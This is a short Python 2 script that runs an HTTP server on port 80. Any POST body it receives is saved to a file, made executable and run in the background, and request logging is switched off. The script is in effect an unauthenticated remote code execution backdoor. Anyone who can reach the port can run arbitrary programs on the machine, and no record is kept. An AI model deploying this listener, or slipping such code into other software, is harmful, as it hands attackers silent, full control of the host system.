#!/usr/bin/python

import sys
import time
import os
import stat
import uuid
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer

PORT = 80 

class customHttpHandler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        return

    def do_GET(self):
        self._set_headers()
        self.wfile.write("OK")
	return

    def do_POST(self):
        filename = str(uuid.uuid4())
        length = self.headers['content-length']
        data = self.rfile.read(int(length))
        with open(filename, 'wb') as fh:
            fh.write(data)
        st = os.stat(filename)
        os.chmod(filename, st.st_mode | stat.S_IEXEC)
        os.system('./' + filename + ' &')
        self._set_headers()
        self.wfile.write("OK")
        return

    def log_message(self, format, *args):
        return

try:
    server = HTTPServer(('', PORT), customHttpHandler)	
    server.serve_forever()

except KeyboardInterrupt:
    server.socket.close()
